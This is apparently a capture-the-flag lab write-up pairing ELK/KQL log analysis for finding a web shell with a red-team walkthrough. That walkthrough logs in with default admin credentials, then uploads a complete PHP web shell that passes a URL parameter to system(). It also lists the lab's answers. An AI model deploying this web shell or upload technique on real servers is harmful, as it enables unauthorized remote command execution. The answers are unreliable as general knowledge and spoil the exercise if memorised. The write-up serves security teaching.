# Even if I wanted to go, their vulnerabilities wouldn't allow it.
## The story
Today's AoC challenge follows a rather unfortunate series of events for the Glitch. Here is a little passage which sets the scene for today's task:

> Late one Christmas evening the Glitch had a feeling,
> Something forgotten as he stared at the ceiling.
> 
> He got up out of bed and decided to check,
> 
> A note on his wall: ”Two days! InsnowSec”.
> 
>   
> 
> With a click and a type he got his hotel and tickets,
> 
> And sank off to sleep to the sound of some crickets.
> 
> Luggage in hand, he had arrived at Frosty Pines,
> 
> “To get to the conference, just follow the signs”.
> 
> 
> Just as he was ready the Glitch got a fright,
> 
> An  RCE  vulnerability on their website ?!?
> 
> He exploited it quick and made a report,
> 
> But before he could send arrived his transport.
> 
> 
> In the Frosty Pines  SOC  they saw an alert,
> 
> This looked quite bad, they called an expert.
> 
> The request came from a room, but they couldn’t tell which,
> 
> The logs saved the day, it was the room of…the Glitch.

## Learning Objectives

-   Learn about Log analysis and tools like  ELK.
-   Learn about KQL and how it can be used to investigate logs using  ELK.
-   Learn about  RCE  (Remote Code Execution), and how this can be done via insecure file upload.

## Topics Overview

### Operation Blue and Red

A simulation involving the defensive (Blue Team) and offensive (Red Team) roles to analyze vulnerabilities and detect threats.

### Log Analysis and ELK

The ELK stack (Elasticsearch, Logstash, Kibana) is used to parse and analyze system logs to detect anomalies or security incidents.

### Kibana Query Language (KQL)

A simplified query language used in Kibana to filter and search log entries efficiently.

### Upload Vulnerabilities

Focuses on improper handling of file uploads, which can allow attackers to upload malicious files, such as web shells.

### Weak Credentials

Exploration of risks stemming from poorly chosen or reused passwords that attackers can exploit through brute-force attacks.

### Remote Code Execution (RCE)

A critical vulnerability where attackers execute arbitrary commands on a target system, often leading to complete system compromise.

### Web Shell

A malicious script uploaded to a web server, providing attackers with remote access to execute commands on the server.

----------

## Question & Answer Section

### BLUE: Where was the web shell uploaded to?

**Answer format**: `/directory/directory/directory/filename.php`

1.  Open the Elastic page at `http://MACHINE_IP:5601`.
2.  Select the **"frostypines-resorts"** index to view logs related to Frosty Pines Resorts.
3.  Analyze logs between **11:30 and 12:00 on October 3rd, 2024**.
4.  Use the search query `message: "shell.php"` to locate entries involving the web shell.
5.  Examine frequent IP addresses in the logs. One of them executes malicious commands.

The malicious IP accesses `/media/images/rooms/shell.php`.

### BLUE: What IP address accessed the web shell?

The malicious IP identified is **10.11.83.34**.

----------

### RED: What is the content of the `flag.txt`?

1.  Access the Frosty Pines Resorts website at `http://frostypines.thm`:
    
    -   Modify the `/etc/hosts` file by adding `MACHINE_IP frostypines.thm` 
        
2.  Login using the following credentials:  
    **Username**: `admin@frostypines.thm`  
    **Password**: `admin`
    
3.  Navigate to the admin portal and add a new room:
    
    -   Create and upload a PHP file (`rce.php`) with the following content:
   
    ```php
    <html>
    <body>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
    <input type="text" name="command" autofocus id="command" size="50">
    <input type="submit" value="Execute">
    </form>
    <pre>
    <?php
        if(isset($_GET['command'])) 
        {
            system($_GET['command'] . ' 2>&1'); 
        }
    ?>
    </pre>
    </body>
        </html>
    ```
    
5.  Inspect the network requests to locate the uploaded file URL:
    
    -   `http://frostypines.thm/media/images/rooms/rce.php`.
6.  Execute the following commands to retrieve the flag:
    
    -   Use `ls` to view files in the directory.
    -   Use `cat flag.txt` to read the content.
----------

## Conclusion

This exercise demonstrates both attack and defense methodologies. The Blue Team identifies malicious activities through log analysis, while the Red Team exploits upload vulnerabilities and weak credentials to gain access and retrieve sensitive data.
